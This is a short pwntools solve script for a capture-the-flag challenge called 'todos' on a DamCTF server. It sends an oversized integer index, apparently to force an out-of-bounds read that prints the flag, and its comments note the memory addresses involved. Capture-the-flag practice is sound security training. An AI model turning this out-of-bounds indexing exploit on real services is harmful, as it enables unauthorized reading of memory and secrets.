from pwn import *
#io = process("./todos")
io = remote("charful.chals.damctf.xyz",30128)
elf = context.binary = ELF("./todos")
context.log_level = 'debug'
# flag 0x00063238
# todos 0x000640a0
# next 0x0006409c
# todos[-65]
payload=b"1844674407370955455"
io.recvuntil(b"do?")
io.sendline(b"2")
io.sendlineafter(b"print?",payload)
io.interactive()
